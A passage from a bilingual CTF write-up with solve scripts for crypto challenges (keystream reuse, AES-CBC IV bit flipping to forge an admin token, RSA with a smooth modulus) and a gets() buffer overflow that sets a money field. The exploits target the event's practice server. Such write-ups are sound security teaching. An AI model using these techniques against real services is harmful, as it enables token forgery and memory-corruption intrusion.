First, pad the <code>FLAG</code> and then encrypt it.<br>
After that, there are countless encryptions.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">PS</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span> <span class="o">//</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">    <span class="n">P</span> <span class="o">=</span> <span class="p">[</span><span class="n">plaintext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">PS</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="n">K</span> <span class="o">=</span> <span class="n">expand_key</span><span class="p">([</span><span class="n">IV</span><span class="p">,</span> <span class="n">KEY</span><span class="p">],</span> <span class="n">PS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">C</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">B</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">P</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">C</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">B</span><span class="p">,</span> <span class="n">K</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">C</span><span class="p">)</span>
</span></span></code></pre></div><p>看一下encrypt()</p>
<ul>
<li><code>plaintext</code>切塊成<code>P</code>(16 byte)</li>
<li><code>PS</code>是塊的數量</li>
<li>生成<code>K</code></li>
<li>把每個<code>add(P[i], K[i])</code>合併成密文</li>
</ul>
<hr>
<p>Look at the <code>encrypt()</code> function:</p>
<ul>
<li>Split the <code>plaintext</code> into <code>P</code> (16 bytes).</li>
<li><code>PS</code> is the number of blocks.</li>
<li>Generate <code>K</code>.</li>
<li>Combine each <code>add(P[i], K[i])</code> to form the ciphertext.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shift_rows</span><span class="p">(</span><span class="n">B</span><span class="p">:</span> <span class="nb">list</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">M</span> <span class="o">=</span> <span class="p">[</span><span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">4</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">M</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">2</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">M</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">2</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">2</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">3</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">3</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">3</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">M</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">3</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">3</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">3</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">M</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">M</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="n">M</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">expand_key</span><span class="p">(</span><span class="n">K</span><span class="p">,</span> <span class="n">PS</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">PS</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">NK</span> <span class="o">=</span> <span class="p">[(</span><span class="o">~</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">K</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">K</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])]</span>
</span></span><span class="line"><span class="cl">        <span class="n">NK</span> <span class="o">=</span> <span class="p">[(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">NK</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">NK</span> <span class="o">=</span> <span class="n">shift_rows</span><span class="p">(</span><span class="n">NK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">K</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">NK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">K</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
</span></span></code></pre></div><p><code>K</code>是這個cipher的keystream<br>
<code>K</code> is the keystream of this cipher.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">a</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([((</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="n">y</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)])</span>
</span></span></code></pre></div>

<h4 class="relative group">sol 
    <div id="sol" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#sol" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>分析add()</p>
<ul>
<li>把<code>a</code>每個byte+1再xor<code>b</code></li>
</ul>
<p>可以發現每次加密的keystream都會一樣，是因為的<code>key</code>和<code>nonce(我這邊取名叫IV)</code>重複使用<br>
所以生成的keystream會是一樣的<br>
剛剛分析過<code>add</code>，我們可以透過傳送<code>\xff</code> * n來獲得長度<code>n</code>的keystream</p>
<hr>
<p>Analysis of the <code>add()</code> Function</p>
<ul>
<li>Increment each byte of <code>a</code> by 1, and xor it with <code>b</code></li>
</ul>
<p>It can be observed that the keystream generated during each encryption is always the same because the <code>key</code> and <code>nonce</code> (which I call <code>IV</code> here) are reused.<br>
Thus, the generated keystream will be the same.<br>
Having analyzed the <code>add</code> function earlier, we can obtain a keystream of length <code>n</code> by sending <code>\xff</code> * n.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;chal.ctf.scint.org&#34;</span><span class="p">,</span> <span class="mi">12001</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Here is your encrypted flag: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;encrypt(hex) &gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;ciphertext: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">plain_1</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([(</span><span class="n">x</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">plain_1</span><span class="p">]))</span>
</span></span></code></pre></div>

<h3 class="relative group">Yoshino&rsquo;s Secret 
    <div id="yoshinos-secret" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#yoshinos-secret" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>我們想把<code>b'{&quot;admin&quot;:false,&quot;id&quot;:&quot;TomotakeYoshino&quot;}'</code>改成<code>b'{&quot;admin&quot;:true,&quot;id&quot;:&quot;TomotakeYoshino&quot;}'</code></p>
<p>AES CBC模式+已知IV+可控IV，我們可以透過<code>bit flipping</code>在不破壞明文結構的情況下竄改部分內容</p>
<p>payload:<br>
$P_i$是第$i$個明文塊<br>
$C_i$是第$i$個密文塊<br>
$P_{ifake}$是我們希望竄改的第$i$個明文塊<br>
$IV \oplus P_1 \oplus P_{1fake}||C_1||C_2||&hellip;||C_n$</p>
<hr>
<p>We want to change <code>b'{&quot;admin&quot;:false,&quot;id&quot;:&quot;TomotakeYoshino&quot;}'</code> to <code>b'{&quot;admin&quot;:true,&quot;id&quot;:&quot;TomotakeYoshino&quot;}'</code>.</p>
<p>In AES CBC mode with a known IV and controllable IV, we can use bit flipping to modify part of the content without breaking the plaintext structure.</p>
<p>Payload:
$P_i$ is the $i$-th plaintext block<br>
$C_i$ is the $i$-th ciphertext block<br>
$P_{ifake}$ is the $i$-th modified plaintext block we want<br>
$IV \oplus P_1 \oplus P_{1fake} || C_1 || C_2 || &hellip; || C_n$</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;chal.ctf.scint.org&#34;</span><span class="p">,</span> <span class="mi">12002</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;token: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="n">token</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">token</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">admin</span><span class="se">\&#34;</span><span class="s2">:false,</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">admin</span><span class="se">\&#34;</span><span class="s2">:true ,</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">iv</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">((</span><span class="n">iv</span> <span class="o">+</span> <span class="n">cipher</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div>

<h3 class="relative group">Proactive Planning 
    <div id="proactive-planning" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#proactive-planning" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>問題:</p>
<p>$$$$$$
\left{
\begin{aligned}
C_1 \equiv m^e \pmod{p} \
C_2 \equiv m^e \pmod{q}
\end{aligned}
\right.
$$$$$$</p>
<p>可以透過<code>中國餘數定理</code>來獲得:<br>
$x \equiv m^e \pmod{pq}$<br>
因為$m^e &lt; N$<br>
所以可以開根號獲得$m$</p>
<p>$N$是平滑數，可以用<code>Pollard's p − 1 algorithm</code>分解</p>
<hr>
<p>Problem:
$$$$$$
\left{
\begin{aligned}
C_1 &amp;\equiv m^e \pmod{p} \
C_2 &amp;\equiv m^e \pmod{q}
\end{aligned}
\right.
$$$$$$
We can use the <code>Chinese Remainder Theorem</code> to obtain:
$x \equiv m^e \pmod{pq}$
Since $m^e &lt; N$, we can take the square root to find $m$.</p>
<p>$N$ is a smooth number, and we can use <code>Pollard's p − 1 algorithm</code> to factor it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">functools</span> <span class="kn">import</span> <span class="n">reduce</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="mi">245420687480030910293131014681513097316897805860015907997290238793037908061889321970643067747599071632004876697443892740373461832739897404992824039705666859978685676148256731481249619240551600688298823327813334982026265819211162436599172552911207622820925395779431967038741077978296032479504244355879076453277839429545428814902805521915851958370011985365075951876093117572939169114186231535255600467275910045372664823195201131313527121300982333739031725446282902152339315042184197622728983863008210927860642758785909138094209306401823250950926284525837770539470052437688590958247465743249015240761650092149407846622211263071037972525183724098938285521476262814934333028607057009674482959012439713961806522389998648832738221606988997592254025463923056643491555337751576246212477882961978575063306242120071365998703341290638505057206765318294021015227372445846979566876416540849080721228851969658123571699007157401963955407592209580070811271329855359365939200000000000000000000000000000000000000000000000000000000000001</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl"><span class="n">C</span> <span class="o">=</span> <span class="p">(</span><span class="mi">439231781791682053787800004789500090515405069827267575310144126412212073183656886443512317513437473988568312910849382831051282684866166595013378449246972680452849180695018251047606404399499477181963259998873867440078915470666285294221911483418402164843781527921484550804953154534529236021532462370697370102805338053891442902369171104271440920515546754256339545640481851380162960169019944927911544549873309962781026864701346082115190565271316812955086674541362687313443721995481784918571627855813953908700661871</span><span class="p">,</span> <span class="mi">45410653305386550806460293366683163840683840887693958374757667150684575232478721464002571675632111383800324454952726849708032360360624723016258879665846393001487751401561000041560174839749619393896575704973412066318065208130082079245493618249592605498133955508921363368248057347635043808420720293553618262120872986948419118763039316625791521751697579251125903615079781604221702413469589144193751155342922907250225850266858411329191983637433918466243662523860234353921039582601873103221279579701559507155136</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crt</span><span class="p">(</span><span class="n">N</span><span class="p">:</span> <span class="nb">tuple</span><span class="p">,</span> <span class="n">C</span><span class="p">:</span> <span class="nb">tuple</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">sum</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">prod</span> <span class="o">=</span> <span class="n">reduce</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">n</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">C</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">prod</span> <span class="o">//</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl">        <span class="nb">sum</span> <span class="o">+=</span> <span class="n">c</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">*</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">sum</span> <span class="o">%</span> <span class="n">prod</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># https://github.com/killua4564/Crypto-pyfile/blob/main/factorization.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pollard</span><span class="p">(</span><span class="n">n</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">GCD</span><span class="p">(</span><span class="n">a</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">p</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">pollard</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="n">N</span> <span class="o">//</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">m_16</span> <span class="o">=</span> <span class="n">crt</span><span class="p">(</span><span class="n">N</span><span class="o">=</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="p">),</span> <span class="n">C</span><span class="o">=</span><span class="n">C</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">iroot</span><span class="p">(</span><span class="n">m_16</span><span class="p">,</span><span class="n">e</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">m_16</span> <span class="o">=</span> <span class="n">crt</span><span class="p">(</span><span class="n">N</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="p">,</span><span class="n">p</span><span class="p">),</span> <span class="n">C</span><span class="o">=</span><span class="n">C</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">iroot</span><span class="p">(</span><span class="n">m_16</span><span class="p">,</span><span class="n">e</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="p">))</span>
</span></span></code></pre></div>

<h2 class="relative group">Pwn 
    <div id="pwn" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#pwn" aria-label="Anchor">#</a>
    </span>        
    
</h2>


<h3 class="relative group">Money overflow 
    <div id="money-overflow" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#money-overflow" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p><del>解法寫在標題上，我人太好了吧</del></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">money</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">customer</span><span class="p">;</span>
</span></span></code></pre></div><p>弱點在<br>
The vulnerability:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">gets</span><span class="p">(</span><span class="n">customer</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
</span></span></code></pre></div><p>不會限制輸入大小<br>
There is no input size limitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chal.ctf.scint.org&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your name: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">65535</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Buy &gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div>

<h3 class="relative group">Insecure Shell 
    <div id="insecure-shell" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#insecure-shell" aria-label="Anchor">#</a>
    </span>        
    
